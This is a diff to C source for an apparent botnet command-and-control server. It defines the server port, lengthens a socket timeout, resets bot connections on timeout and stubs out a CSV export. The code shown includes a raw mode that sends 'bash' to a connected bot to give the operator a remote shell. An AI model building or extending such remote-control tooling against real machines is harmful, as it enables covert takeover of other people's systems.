@@ -13,6 +13,9 @@ Code has no functionality to exit cleanly.exir
 #include <stdio.h>
 #include <sys/select.h>
 
+#define SERVER_PORT 8881
+#define TIMEOUT_VALUE 120
+
 // Function declarations
 void print_connection(connection client_con, int new_fd);
 void print_welcome_message();
@@ -20,6 +23,7 @@ void print_help_screen();
 void print_command_help_screen();
 void *handle_connection(void *my_connection);
 void *bot_command(void *current);
+//void output_to_csv();
 
 // Global Graceful Exit Flag
 int exitflag = 0;
@@ -29,7 +33,7 @@ static pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;
 int main(void)
 {
     // Set the client connection to be the head of the list
-    connection client_con = bind_socket("127.0.0.1", 8881);
+    connection client_con = bind_socket("127.0.0.1", SERVER_PORT);
     client_con.next = NULL;
 
     print_welcome_message();
@@ -150,7 +154,7 @@ void *bot_command(void *arg)
     connection *tmp = (connection *)malloc(sizeof(connection));
 
     struct timeval timeout;
-    timeout.tv_sec = 10;
+    timeout.tv_sec = TIMEOUT_VALUE;
     timeout.tv_usec = 0;
 
     while (1)
@@ -319,9 +323,7 @@ void *bot_command(void *arg)
                     }
                     printf("[+] Entering raw input mode with client %s\n", tmp->hostname);
                     printf("[+] To escape raw mode, type exit\n");
-                    rc = send(tmp->pfds->fd, "bash", 5, 0);
-
-                    printf("rc: %d\n", rc);
+                    send(tmp->pfds->fd, "bash", 5, 0);
 
                     // This is where the ugly low-level stuff begins... Essentially the same code as the client side.
                     // Within the while loop, we shouldn't clutter the screen with lots of server generated messages
@@ -340,7 +342,10 @@ void *bot_command(void *arg)
                         int select_return = select(tmp->pfds->fd + 1, &raw_fds, NULL, NULL, &timeout);
 
                         if (select_return == 0){
-                            printf("Timeout occured.\n");
+                            printf("[-] Timeout occured. Resetting socket.\n");
+                            // Timeout occured, close fd and force client to reconnect if active connection exists
+                            close(tmp->pfds->fd);
+                            delete_connection(head, tmp);
                             safe_exit = 1;
                             break;
                         }
@@ -433,6 +438,21 @@ void *bot_command(void *arg)
         }
     }
 }
+
+// void output_to_csv()
+// {
+//     char *outputFile = "output.csv";
+
+//     printf("Writing output to %s\n", outputFile);
+
+//     FILE *fp = fopen(outputFile, "a+");
+
+//     printf("File created. Closing file.\n");
+
+//     fclose(fp);
+
+
+// }
 
 // Function to print welcome screen
 void print_welcome_message()
